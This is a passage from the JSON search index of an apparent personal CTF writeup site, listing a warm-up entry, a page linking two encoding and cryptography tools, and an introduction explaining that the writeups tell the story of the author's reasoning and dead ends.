WarmUp","tags":[],"description":"","content":"Challenges were found over Discord. Started on April 5th 2022.\n"},{"uri":"https://n1trate.github.io/writeups/tools/","title":"Tools","tags":[],"description":"","content":"https://www.cryptool.org/en/cto/\nhttps://www.asciitohex.com/\n"},{"uri":"https://n1trate.github.io/writeups/_footer/","title":"","tags":[],"description":"","content":"Weeeeeeeeeeeeeeee\n"},{"uri":"https://n1trate.github.io/writeups/categories/","title":"Categories","tags":[],"description":"","content":""},{"uri":"https://n1trate.github.io/writeups/tags/","title":"Tags","tags":[],"description":"","content":""},{"uri":"https://n1trate.github.io/writeups/","title":"Writeups","tags":[],"description":"","content":"Writeups Hello.\nIf you\u0026rsquo;re looking for writeup that goes straight to the point, this may not be it.\nIf you\u0026rsquo;re looking for stories, failures, and hope, you may find what you\u0026rsquo;re looking for.\nI believe having a story of how people are thinking while trying to solve challenges and problems is as valuable as the solution itself. Maybe that rabbit hole wasn\u0026rsquo;t useful today, but it may be tomorrow.\nIn any case, I hope you\u0026rsquo;ll enjoy the read.\n"}]